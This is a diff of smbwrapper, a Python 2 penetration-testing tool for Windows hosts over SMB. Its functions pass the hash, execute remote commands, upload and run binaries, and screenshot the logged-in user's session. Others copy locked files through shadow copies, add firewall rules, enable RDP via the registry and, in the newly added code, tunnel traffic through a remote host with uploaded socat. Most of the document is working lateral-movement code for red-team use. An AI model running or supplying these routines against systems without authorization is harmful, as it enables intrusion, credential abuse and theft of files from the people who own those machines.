@@ -15,8 +15,7 @@
 # You should have received a copy of the GNU General Public License along
 # with this program.  If not, see <http://www.gnu.org/licenses/>.
 
-import sys, os, time, string, socket, subprocess
-from pprint import pprint
+import sys, os, time, string, socket, subprocess, inspect
 
 try:
 	import sqlite3
@@ -24,9 +23,9 @@ except:
 	print "[!] Please install python-sqlite3 extension."
 	sys.exit(0)
 
-__version__ = 0.9
+__version__ = '1.0.0alpha'
 __author__ = 'jrm`'
-__description__ = 'Run stuff remotely - Extract passwords - Pass the Hash'
+__description__ = 'Run stuff remotely - Pass the Hash'
 
 BASEDIR = os.path.dirname(os.path.realpath(__file__)) + '/tools'
 TOOLS = {
@@ -39,7 +38,7 @@ TOOLS = {
 	'tar': BASEDIR + '/win/tar.exe',
 	'nircmd': BASEDIR + '/win/nircmd.exe',
 	'runastask': BASEDIR + '/win/runastask.exe',
-	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe'},
+	'mbsa': {'dll': BASEDIR + '/win/mbsa/$ARCH$/wusscan.dll', 'exe': BASEDIR + '/win/mbsa/$ARCH$/mbsacli.exe', 'cab': BASEDIR + '/win/mbsa/wsusscn2.cab', 'bat': BASEDIR + '/win/mbsa/mbsa.bat'},
 }
 CONF = {
 	'system': False,
@@ -54,7 +53,7 @@ CONF = {
 def main():
 	sys.argv[0] = os.path.basename(sys.argv[0])
 
-	if len(sys.argv) < 3 or '-h' in sys.argv or 'help' in sys.argv:
+	if len(sys.argv) < 2 or '-h' in sys.argv or 'help' in sys.argv:
 		usage()
 
 	check_vault()
@@ -71,35 +70,39 @@ def main():
 			CONF['creds_file'] = sys.argv[pos+1]
 			del sys.argv[pos:pos+1]
 		except:
-			text("[!] Option -f requires an argument.")
-			sys.exit(0)
+			text("[!] Option -f requires an argument.", 1)
 
 		if not os.path.exists(CONF['creds_file']):
-			text("[!] %s: file not found." % CONF['creds_file'])
-			sys.exit(0)
+			text("[!] %s: file not found." % CONF['creds_file'], 1)
 
 	# Check command validity and jump to main function
 	command = 'smb_%s' % sys.argv[1]
 	if command in dict(get_commands()).keys():
 
-		if sys.argv[1] not in ['creds', 'hash', 'rdp', 'mount']:
-			check_host()
-
-		try:
-			CONF['smb_ip'] = sys.argv[2]
-		except:
+		if len(sys.argv) < 3:
 			usage()
+
+		if sys.argv[1] not in ['creds', 'hash'] and 'update' not in sys.argv:
+
+			try:
+				CONF['smb_ip'] = socket.gethostbyname(sys.argv[2])
+			except socket.gaierror:
+				text("[!] Unable to resolve hostname.", 1)
+			except:
+				usage()
+
+			if sys.argv[1] not in ['rdp', 'mount']:
+				check_host()
 
 		globals()[command]()
 
 	else:
-		text("[!] Not a valid command.")
-		sys.exit(0)
+		text("[!] Not a valid smbwrapper command.", 1)
 
 def color(txt, code = 1, modifier = 0):
 	return "\033[%d;3%dm%s\033[0m" % (modifier, code, txt)
 
-def text(txt, r = False):
+def text(txt, e = False):
 
 	if CONF['verbose']:
 
@@ -114,10 +117,10 @@ def text(txt, r = False):
 		else:
 			ret = txt
 
-	if r == True:
-		return ret + "\n"
-	else:
-		print ret
+	print ret
+
+	if e is not False:
+		sys.exit(0)
 
 def check_vault():
 
@@ -134,14 +137,18 @@ def check_creds():
 	check = smbclient('quit')
 
 	if 'session setup failed' in check or 'tree connect failed' in check:
-		text('[!] %s' % check)
-		sys.exit(0)
+		text('[!] %s' % check, 1)
 
 	return True
 
 def check_tool(tool):
 	if tool in TOOLS.keys():
-		return check_path(TOOLS[tool])
+
+		if isinstance(TOOLS[tool], dict):
+			return check_tool(TOOLS[tool])
+
+		else:
+			return check_path(TOOLS[tool])
 
 	return False
 
@@ -149,11 +156,10 @@ def check_host():
 	try:
 		sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM) 
 		sock.settimeout(2)
-		sock.connect((sys.argv[2], 445))
+		sock.connect((CONF['smb_ip'], 445))
 		sock.close()
 	except:
-		text("[!] %s: port 445 unreachable" % sys.argv[2])
-		sys.exit(0)
+		text("[!] %s: port 445 unreachable" % sys.argv[2], 1)
 
 def check_path(path):
 	if '$ARCH$' in path:
@@ -161,8 +167,7 @@ def check_path(path):
 		check_path(path.replace('$ARCH$', 'x64'))
 	else:
 		if not os.path.exists(path):
-			text("[!] %s: file not found." % path)
-			sys.exit(0)
+			text("[!] %s: file not found." % path, 1)
 
 	return True
 
@@ -186,7 +191,7 @@ def usage():
 
 	f = os.path.basename(__file__)
 
-	print color(f +" v%.1f by %s - %s\n" % (__version__, __author__, __description__), 6, 1)
+	print color(f +" v%s by %s - %s\n" % (__version__, __author__, __description__), 6, 1)
 	print color(f +" -h", 7, 1) +" \t\t\t This help"
 	print color(f +" -f <file>", 7, 1) +"\t\t Specify an alternative credential vault"
 
@@ -200,13 +205,15 @@ def usage():
 
 	for cmd in get_commands():
 		if c == 'help' or c == cmd[0][4:]:
-			print "   %s %s" % (color('%s %s' % (f,cmd[0][4:]), 3, 1), cmd[1])
+			print "   %s %s %s" % (color(f, 3, 3), color(cmd[0][4:], 3, 1), cmd[1])
 			print ""
 
 	print "   If the command supports it, use the "+ color("'-s'", 7, 1) +" option to attempt remote LocalSystem elevation.\n"
 	print "   Instead of using username+password or username+hash on the commandline,"
-	print "   you can use the "+ color("smb creds", 3, 1) +" command to populate the credential vault.\n"
+	print "   you can use the "+ color("smb.py", 3, 3) + " " + color("creds", 3, 1) +" command to populate the credential vault.\n"
 	print "   Usernames must be specified using the "+ color("DOMAIN\\LOGIN", 7, 1) +" syntax.\n"
+	print "   See usage examples at: " + color('https://github.com/jrmdev/smbwrapper/blob/master/README.md', 4, 4)
+	print ""
 
 	sys.exit(0)
 
@@ -219,8 +226,7 @@ def creds_from_file():
 	(count,) = res.fetchone()
 
 	if count == 0:
-		text("[!] No credentials to use. Use the smb_creds command to add some.")
-		sys.exit(0)
+		text("[!] No credentials to use. Use the smb_creds command to add some.", 1)
 
 	res = cursor.execute("SELECT username, password, ntlm_hash FROM creds WHERE active=1 LIMIT 1")
 
@@ -261,8 +267,50 @@ def set_creds(length):
 
 def ntlm_hash(str):
 	import hashlib, binascii
-	hash = hashlib.new('md4', sys.argv[2].encode('utf-16le')).digest()
-	return binascii.hexlify(hash).upper()
+	h = hashlib.new('md4', str.encode('utf-16le')).digest()
+	return binascii.hexlify(h).upper()
+
+def download_file(src, dst, statusbar = True):
+	from urllib2 import urlopen
+
+	u = urlopen(src)
+	f = open(dst, 'wb')
+
+	meta = u.info()
+	file_size = int(meta.getheaders("Content-Length")[0])
+	
+	if file_size == 0:
+		text("[!] Error: File empty.")
+
+	text("[*] File Size: %s" % file_size)
+
+	file_size_dl = 0
+	block_sz = 8192
+
+	try:
+		while True:
+			buffer = u.read(block_sz)
+		
+			if not buffer:
+				break
+		
+			file_size_dl += len(buffer)
+			f.write(buffer)
+		
+			status = r"%10d  [%3.2f%%]" % (file_size_dl, file_size_dl * 100. / file_size)
+			status = status + chr(8)*(len(status)+1)
+		
+			if statusbar:
+				sys.stdout.write(status)
+
+		print ""
+
+	except KeyboardInterrupt:
+		f.close()
+		print "\r"
+		text("[*] Exiting...", 1)
+
+	f.close()
 
 def smbclient(cmd):
 	check_tool('smbclient')
@@ -298,7 +346,7 @@ def winexe(cmd):
 	run.append('//'+ CONF['smb_ip'])
 	run.append(cmd)
 
-	if cmd.lower() != 'cmd':
+	if not cmd.lower().startswith('cmd'):
 		process = subprocess.Popen(run, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT)
 		
 		ret = process.stdout.read()
@@ -339,279 +387,11 @@ def up_and_exec(localcmd, delete_after = True):
 		return ret
 
 	else:
-		text("[!] %s: file not found." % localcmd[0])
-		sys.exit(0)
-
-def smb_exec():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ] <cmd>
-	Execute a command remotely (use "cmd" for a command prompt)
-	"""
-
-	set_creds(4)
-	check_creds()
-	print winexe(' '.join(sys.argv[3:]))
-
-def smb_upexec():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ] <localfile.exe [-arg1 [-argx]]>
-	Upload a file and run it remotely with the specified arguments
-	"""
-
-	set_creds(4)
-	check_creds()
-	print up_and_exec(sys.argv[3:])
-
-def smb_upload():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ] <localfile> <remotefile>
-	Upload a file to the host
-	"""
-
-	set_creds(5)
-	check_creds()
-
-	if len(sys.argv) != 5:
-		usage()
-
-	if os.path.exists(sys.argv[3]):
-		print smbclient('put "%s" "%s"' % (sys.argv[3], sys.argv[4]))
-	else:
-		text("[!] %s: file not found." % sys.argv[3])
-		sys.exit(0)
-
-def smb_download():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ] <remotefile> <localfile>
-	Download a file from the host
-	"""
-
-	set_creds(5)
-	check_creds()
-
-	if len(sys.argv) != 5:
-		usage()
-
-	print smbclient('get "%s" "%s"' % (sys.argv[3], sys.argv[4]))
-
-def smb_scrshot():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ]
-	Takes a screenshot of the active session
-	"""
-
-	set_creds(3)
-	check_tool('runastask')
-	check_tool('nircmd')
-
-	text("[*] Uploading tools...")
-	smbclient('put "%s" "\\windows\\temp\\r.exe"' % TOOLS['runastask'])
-	smbclient('put "%s" "\\windows\\temp\\n.exe"' % TOOLS['nircmd'])
-
-	text("[*] Capturing screenshot...")
-	filename = '/tmp/screenshot.%s.png' % str(time.time())
-
-	winexe('\\windows\\temp\\r.exe %s C:\\windows\\temp\\n.exe savescreenshotfull C:\\windows\\temp\\s.png' % CONF['smb_user'])
-	smbclient('get "\\windows\\temp\\s.png" "%s"' % filename);
-
-	text("[*] Cleaning files...")
-	smbclient('del "\\windows\\temp\\n.exe"')
-	smbclient('del "\\windows\\temp\\r.exe"')
-	smbclient('del "\\windows\\temp\\s.png"')
-
-	if os.path.exists(filename):
-
-		text("[*] Screenshot saved under %s." % filename)
-		os.system('display "%s" &' % filename)
-		text("[*] Done.")
-	
-	else:
-		text("[!] Failed. Is the user logged in?.")
-		sys.exit(0)
-
-def smb_vsscpy():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ] <remotefile> <localfile>
-	Use shadow copies to download a locked file from the host
-	"""
-
-	check_tool('vsscpy')
-	set_creds(5)
-
-	if len(sys.argv) != 5:
-		usage()
-
-	check_creds()
-
-	remotefile = sys.argv[3]
-	localfile = sys.argv[4]
-
-	text("[*] Uploading script...")
-	smbclient('put "%s" "\\windows\\temp\\vsscpy.vbs"' % TOOLS['vsscpy'])
-
-	text("[*] Running script...")
-	winexe('cscript \\windows\\temp\\vsscpy.vbs "%s"' % remotefile.lower().replace('c:', ''))
-
-	text("[*] Downloading file...")
-	print smbclient('get "\\windows\\temp\\temp.tmp" "%s"' % localfile)
-
-	text("[*] Removing temp files...")
-	smbclient('del "\\windows\\temp\\temp.tmp"')
-	smbclient('del "\\windows\\temp\\vsscpy.vbs"')
-
-	text("[*] Done.");
-
-def smb_fwrule(action = None, param = None):
-	"""
-	[-s] <ip> [ user ] [ password ] <add | del> <program path | port number>
-	Creates or remove a rule in the Windows firewall
-	"""
-
-	import inspect
-	
-	if len(inspect.stack()) == 3: # Function called directly from command line
-
-		set_creds(5)
-		check_creds()
-
-		if len(sys.argv) != 5 or sys.argv[3] not in ['add', 'del']:
-			usage()
-
-		action = sys.argv[3]
-		param = sys.argv[4]
-
-	name = 'Core Networking - SMB' # Or whatever you want as a rule name
-	param = str(param)
-
-	text("[*] %sing firewall rule..." % ('Add' if action == 'add' else 'Delet'))
-	
-	if param.isdigit(): # Adding a port rule
-		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' % 
-			(action, name, 'action=allow' if action == 'add' else '', param))
-
-	else: # Adding a program rule
-		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' % 
-			(action, name, 'action=allow' if action == 'add' else '', param))
-
-	if 'Ok.' in ret:
-		text("[*] Success.")
-	else:
-		text("[!] Failed.")
-
-def smb_mount():
-	"""
-	<ip> [ user ] [ password ] <share> <localpath>
-	Mount a remote share locally via CIFS (Pass-the-Hash not available)
-	"""
-
-	set_creds(5)
-
-	if len(sys.argv) != 5:
-		usage()
-
-	share = sys.argv[3]
-	localdir = sys.argv[4]
-
-	if not os.path.exists(localdir):
-		os.mkdir(localdir)
-
-	if CONF['smb_pass'] == '':
-		text("[!] Pass-The-Hash not available for mount.")
-		sys.exit(0)
-
-	opts = ['password='+ CONF['smb_pass'], 'uid='+ str(os.getuid()), 'gid='+ str(os.getgid()), 'file_mode=0644', 'dir_mode=0755']
-
-	if '\\' in CONF['smb_user']:
-		opts += CONF['smb_user'].split('\\')
-
-	else:
-		opts += ['username='+ CONF['smb_user']]
-
-	os.system('sudo mount -t cifs -o "%s" "//%s/%s" "%s"' % (','.join(opts), CONF['smb_ip'], share, localdir))
-
-def smb_rdp():
-	"""
-	<ip> [ user ] [ password | ntlm_hash ] [ enable | disable ]
-	Open a Remote Desktop session using xfreerdp (Pass-the-Hash = restricted admin)
-	"""
-
-	if 'enable' in sys.argv:
-		set_creds(4)
-		text("[*] Updating Registry...")
-		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
-		smb_fwrule('add', 3389)
-		sys.exit(0)
-
-	if 'disable' in sys.argv:
-		set_creds(4)
-		text("[*] Updating Registry...")
-		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
-		smb_fwrule('del', 3389);
-		sys.exit(0)
-
-	set_creds(3)
-	check_tool('xfreerdp')
-
-	res = screen_resolution()
-	max_res = '%dx%d' % (int(res[0]), int(res[1]) - 50)
-
-	run = []
-	run.append(TOOLS['xfreerdp'])
-	run.append('/size:%s' % max_res)
-	run.append('/t:%s' % CONF['smb_ip'])
-	run.append('/v:%s' % CONF['smb_ip'])
-
-	if '\\' in CONF['smb_user']:
-		tab = CONF['smb_user'].split('\\', 2)
-		run.append('/d:%s' % tab[0])
-		run.append('/u:%s' % tab[1])
-
-	else:
-		run.append('/u:%s' % CONF['smb_user'])
-
-	if CONF['smb_pass'] == '':
-		text("[!] Note: Pass-the-Hash with RDP only works for local admin accounts and under the restricted admin mode.")
-		run.append('/pth:%s' % CONF['smb_hash'])
-		run.append('/restricted-admin')
-
-	else:
-		run.append('/p:%s' % CONF['smb_pass'])
-
-	# Tweak the following to suit your needs
-	run.append("+clipboard")
-	run.append("+home-drive")
-	run.append("-decorations")
-	run.append("/cert-ignore") # baaad.
-
-	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)
-
-def smb_portfwd():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ] <lport> <rhost> <rport>
-	Forward a remote port to a remote address
-	"""
-
-	print 'smb_portfwd not yet implemented'
-
-def smb_revfwd():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ] <lport> <rhost> <rport>
-	Reverse-forward a remote address/port locally
-	"""
-
-	print 'smb_revtun not yet implemented'
-
-def smb_mbsa():
-	"""
-	[-s] <ip> [ user ] [ password | ntlm_hash ]
-	Run MBSA on the remote host
-	"""
-
-	print 'smb_mbsa not yet implemented'
+		text("[!] %s: file not found." % localcmd[0], 1)
 
 def smb_creds():
 	"""
-	[ list | set | del | use ] <user> <password | ntlm_hash>
+	[ list | set | del | use ] <user> <passwd/nthash>
 	Manage SMB credentials
 	"""
 
@@ -714,10 +494,391 @@ def smb_creds():
 
 			cursor.close()
 
+def smb_exec():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <cmd>
+	Execute a command remotely (use "cmd" for a command prompt)
+	"""
+
+	set_creds(4)
+	check_creds()
+	print winexe(' '.join(sys.argv[3:]))
+
+def smb_upexec():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <localfile.exe [-arg1 [-argx]]>
+	Upload a file and run it remotely with the specified arguments
+	"""
+
+	set_creds(4)
+	check_creds()
+	print up_and_exec(sys.argv[3:])
+
+def smb_upload():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <localfile> <remotefile>
+	Upload a file to the host
+	"""
+
+	set_creds(5)
+	check_creds()
+
+	if len(sys.argv) != 5:
+		usage()
+
+	if os.path.exists(sys.argv[3]):
+		print smbclient('put "%s" "%s"' % (sys.argv[3], sys.argv[4]))
+	else:
+		text("[!] %s: file not found." % sys.argv[3], 1)
+
+def smb_download():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
+	Download a file from the host
+	"""
+
+	set_creds(5)
+	check_creds()
+
+	if len(sys.argv) != 5:
+		usage()
+
+	print smbclient('get "%s" "%s"' % (sys.argv[3], sys.argv[4]))
+
+def smb_scrshot():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ]
+	Takes a screenshot of the active session
+	"""
+
+	set_creds(3)
+	check_tool('runastask')
+	check_tool('nircmd')
+
+	text("[*] Uploading tools...")
+	smbclient('put "%s" "\\windows\\temp\\r.exe"' % TOOLS['runastask'])
+	smbclient('put "%s" "\\windows\\temp\\n.exe"' % TOOLS['nircmd'])
+
+	text("[*] Capturing screenshot...")
+	filename = '/tmp/screenshot.%s.png' % str(time.time())
+
+	winexe('\\windows\\temp\\r.exe %s C:\\windows\\temp\\n.exe savescreenshotfull C:\\windows\\temp\\s.png' % CONF['smb_user'])
+	smbclient('get "\\windows\\temp\\s.png" "%s"' % filename);
+
+	text("[*] Cleaning files...")
+	smbclient('del "\\windows\\temp\\n.exe"')
+	smbclient('del "\\windows\\temp\\r.exe"')
+	smbclient('del "\\windows\\temp\\s.png"')
+
+	if os.path.exists(filename):
+
+		text("[*] Screenshot saved under %s." % filename)
+		os.system('display "%s" &' % filename)
+		text("[*] Done.")
+	
+	else:
+		text("[!] Failed. Is the user logged in?.", 1)
+
+def smb_vsscpy():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <remotefile> <localfile>
+	Use shadow copies to download a locked file from the host
+	"""
+
+	check_tool('vsscpy')
+	set_creds(5)
+
+	if len(sys.argv) != 5:
+		usage()
+
+	check_creds()
+
+	remotefile = sys.argv[3]
+	localfile = sys.argv[4]
+
+	text("[*] Uploading script...")
+	smbclient('put "%s" "\\windows\\temp\\vsscpy.vbs"' % TOOLS['vsscpy'])
+
+	text("[*] Running script...")
+	winexe('cscript \\windows\\temp\\vsscpy.vbs "%s"' % remotefile.lower().replace('c:', ''))
+
+	text("[*] Downloading file to '%s'..." % localfile)
+	smbclient('get "\\windows\\temp\\temp.tmp" "%s"' % localfile)
+
+	text("[*] Removing temp files...")
+	smbclient('del "\\windows\\temp\\temp.tmp"')
+	smbclient('del "\\windows\\temp\\vsscpy.vbs"')
+
+	text("[*] Done.");
+
+def smb_fwrule(action = None, param = None):
+	"""
+	[-s] <ip> [ user ] [ password ] <add | del> <program path | port number>
+	Create or remove a rule in the Windows firewall
+	"""
+	
+	if len(inspect.stack()) == 3: # Function called directly from command line
+
+		set_creds(5)
+		check_creds()
+
+		if len(sys.argv) != 5 or sys.argv[3] not in ['add', 'del']:
+			usage()
+
+		action = sys.argv[3]
+		param = sys.argv[4]
+
+	name = 'Core Networking - SMB' # Or whatever you want as a rule name
+	param = str(param)
+
+	text("[*] %sing firewall rule..." % ('Add' if action == 'add' else 'Delet'))
+	
+	if param.isdigit(): # Adding a port rule
+		ret = winexe('netsh advfirewall firewall %s rule dir=in name="%s" %s protocol=TCP localport=%s' % 
+			(action, name, 'action=allow' if action == 'add' else '', param))
+
+	else: # Adding a program rule
+		ret = winexe('netsh advfirewall firewall %s rule dir=out name="%s" %s program="%s"' % 
+			(action, name, 'action=allow' if action == 'add' else '', param))
+
+	if 'Ok.' in ret:
+		text("[*] Success.")
+	else:
+		text("[!] Failed.")
+
+def smb_mount():
+	"""
+	<ip> [ user ] [ password ] <share> <localpath>
+	Mount a remote share locally via CIFS (Pass-the-Hash not available)
+	"""
+
+	set_creds(5)
+
+	if len(sys.argv) != 5:
+		usage()
+
+	share = sys.argv[3]
+	localdir = sys.argv[4]
+
+	if not os.path.exists(localdir):
+		os.mkdir(localdir)
+
+	if CONF['smb_pass'] == '':
+		text("[!] Pass-The-Hash not available for mount.", 1)
+
+	opts = ['password='+ CONF['smb_pass'], 'uid='+ str(os.getuid()), 'gid='+ str(os.getgid()), 'file_mode=0644', 'dir_mode=0755']
+
+	if '\\' in CONF['smb_user']:
+		opts += CONF['smb_user'].split('\\')
+
+	else:
+		opts += ['username='+ CONF['smb_user']]
+
+	os.system('sudo mount -t cifs -o "%s" "//%s/%s" "%s"' % (','.join(opts), CONF['smb_ip'], share, localdir))
+
+def smb_rdp():
+	"""
+	<ip> [ user ] [ passwd/nthash ] [ enable | disable ]
+	Open a Remote Desktop session using xfreerdp (Pass-the-Hash = restricted admin)
+	"""
+
+	if 'enable' in sys.argv:
+		set_creds(4)
+		text("[*] Updating Registry...")
+		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f')
+		smb_fwrule('add', 3389)
+		sys.exit(0)
+
+	if 'disable' in sys.argv:
+		set_creds(4)
+		text("[*] Updating Registry...")
+		winexe('reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f')
+		smb_fwrule('del', 3389);
+		sys.exit(0)
+
+	set_creds(3)
+	check_tool('xfreerdp')
+
+	res = screen_resolution()
+	max_res = '%dx%d' % (int(res[0]), int(res[1]) - 50)
+
+	run = []
+	run.append(TOOLS['xfreerdp'])
+	run.append('/size:%s' % max_res)
+	run.append('/t:%s' % CONF['smb_ip'])
+	run.append('/v:%s' % CONF['smb_ip'])
+
+	if '\\' in CONF['smb_user']:
+		tab = CONF['smb_user'].split('\\', 2)
+		run.append('/d:%s' % tab[0])
+		run.append('/u:%s' % tab[1])
+
+	else:
+		run.append('/u:%s' % CONF['smb_user'])
+
+	if CONF['smb_pass'] == '':
+		text("[!] Note: Pass-the-Hash with RDP only works for local admin accounts and under the restricted admin mode.")
+		run.append('/pth:%s' % CONF['smb_hash'])
+		run.append('/restricted-admin')
+
+	else:
+		run.append('/p:%s' % CONF['smb_pass'])
+
+	# Tweak the following to suit your needs
+	run.append("+clipboard")
+	run.append("+home-drive")
+	run.append("-decorations")
+	run.append("/cert-ignore") # baaad.
+
+	os.spawnvpe(os.P_WAIT, run[0], run, os.environ)
+
+def smb_portfwd(lport = None, rhost = None, rport = None):
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
+	Forward a remote port to a remote address
+	"""
+	
+	if len(inspect.stack()) == 3: # Function called directly from command line
+
+		set_creds(6)
+		check_creds()
+
+		if len(sys.argv) != 6:
+			usage()
+
+		lport = int(sys.argv[3])
+		rport = int(sys.argv[5])
+		rhost = sys.argv[4]
+
+	text("[*] Setting up port forwarding...")
+
+	ret = winexe("netsh interface portproxy add v4tov4 listenport=%d connectport=%d connectaddress=%s" % 
+		(lport, rport, rhost))
+	
+	text("[i] Connections to %s:%d are now forwarded to %s:%d" % (CONF['smb_ip'], lport, rhost, rport))
+	text("[i] Hit CTRL+C when done...")
+
+	try:
+		raw_input()
+	
+	except KeyboardInterrupt:
+
+		sys.stdout.write('\r')
+		text("[*] Stopping port forwarding...");
+		winexe('netsh interface portproxy reset')
+
+	text("[*] Done.")
+
+def smb_revfwd(lport = None, rhost = None, rport = None):
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ] <lport> <rhost> <rport>
+	Reverse-forward a remote address/port locally
+	"""
+	
+	if len(inspect.stack()) == 3: # Function called directly from command line
+
+		set_creds(6)
+		check_creds()
+
+		if len(sys.argv) != 6:
+			usage()
+
+		lport = int(sys.argv[3])
+		rport = int(sys.argv[5])
+		rhost = sys.argv[4]
+
+	check_tool('socat.tar')
+	check_tool('socat')
+	check_tool('tar')
+
+	local_if = subprocess.Popen(['ip', 'route', 'get', 'to', CONF['smb_ip']], stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.STDOUT).stdout.readlines()[0]
+	local_if = local_if.strip().split()[-1]
+
+	text("[*] Uploading files...")
+	smbclient('put "%s" "\\windows\\temp\\tar.exe"' % TOOLS['tar'])
+	smbclient('put "%s" "\\windows\\temp\\socat.tar"' % TOOLS['socat.tar'])
+
+	winexe('\\windows\\temp\\tar.exe xf /windows/temp/socat.tar -C /windows/temp')
+
+	text("[*] Setting up local listener...")
+	process = subprocess.Popen([ TOOLS['socat'], 
+		'TCP-LISTEN:%d,bind=%s,reuseaddr,fork' % (lport, local_if),
+		'TCP-LISTEN:56789,reuseaddr' ])
+
+	smb_fwrule('add', 'C:\\windows\\temp\\socat\\socat.exe')
+
+	text("[*] Creating reverse tunnel...");
+	text("[i] %s:%d <--> %s:56789 <--> %s:%d" % (rhost, rport, CONF['smb_ip'], local_if, lport))
+	text("[i] Now point your client to %s:%d" % (local_if, lport))
+	winexe('\\windows\\temp\\socat\\socat.exe TCP:%s:56789,forever,interval=1 TCP:%s:%d' % (local_if, rhost, rport))
+
+	text("[*] Cleaning up...");
+	winexe('cmd /c del /f/q \\windows\\temp\\socat.tar \\windows\\temp\\tar.exe & rmdir /q/s \\windows\\temp\\socat');
+	process.terminate()
+
+	smb_fwrule('del', 'C:\\windows\\temp\\socat\\socat.exe');
+
+	text("[*] Done.");
+
+def smb_mbsa():
+	"""
+	[-s] <ip> [ user ] [ passwd/nthash ]
+	Run MBSA on the remote host
+	"""
+
+	if sys.argv[2] == 'update':
+		text("[*] Downloading MBSA catalog updates...")
+		download_file("http://go.microsoft.com/fwlink/?LinkId=76054", TOOLS['mbsa']['cab'])
+		text("[*] Done.", 1)
+
+	if not os.path.exists(TOOLS['mbsa']['cab']):
+		text("[!] MBSA cab file not found. To download, run '%s mbsa update'" % sys.argv[0], 1)
+
+	set_creds(3)
+	check_tool('mbsa')
+
+	text("[*] Preparing MBSA...")
+
+	arch = 'x86' if os_architecture() == 32 else 'x64'
+	TOOLS['mbsa']['exe'] = TOOLS['mbsa']['exe'].replace('$ARCH$', arch)
+	TOOLS['mbsa']['dll'] = TOOLS['mbsa']['dll'].replace('$ARCH$', arch)
+
+	import tarfile
+	archive = tarfile.open('/tmp/mbsa.tar', mode='w')
+	
+	try:
+		for k, v in TOOLS['mbsa'].iteritems():
+			archive.add(v, arcname=os.path.basename(v))
+	finally:
+		archive.close()
+
+	text("[*] Uploading files...")
+
+	smbclient('put "%s" "\\windows\\temp\\tar.exe"' % TOOLS['tar'])
+	smbclient('put "/tmp/mbsa.tar" "\\windows\\temp\\mbsa.tar"')
+	smbclient('mkdir \\windows\\temp\\mbsa')
+	os.unlink('/tmp/mbsa.tar')
+
+	text("[*] Running...")
+
+	winexe('\\windows\\temp\\tar.exe xf /windows/temp/mbsa.tar -C /windows/temp/mbsa')
+	winexe('\\windows\\temp\\mbsa\\mbsa.bat')
+
+	text("[*] Downloading results...")
+	smbclient('get "\\windows\\temp\\mbsa\\results.xml" "/tmp/mbsa_%s.xml"' % CONF['smb_ip']);
+
+	text("[*] Cleaning up...");
+	winexe('cmd /c del /f/q \\windows\\temp\\mbsa.tar \\windows\\temp\\tar.exe & rmdir /q/s \\windows\\temp\\mbsa');
+
+	if os.path.exists('/tmp/mbsa_%s.xml' % CONF['smb_ip']):
+		text("[*] Excel-friendly results saved under /tmp/mbsa_%s.xml" % CONF['smb_ip'])
+	else:
+		text("[!] Failed.")
+
 def smb_hash():
 	"""
 	<plaintext>
-	Generate a NTLM hash from a plaintex
+	Generate a NTLM hash from a plaintext
 	"""
 
 	print ntlm_hash(sys.argv[2])
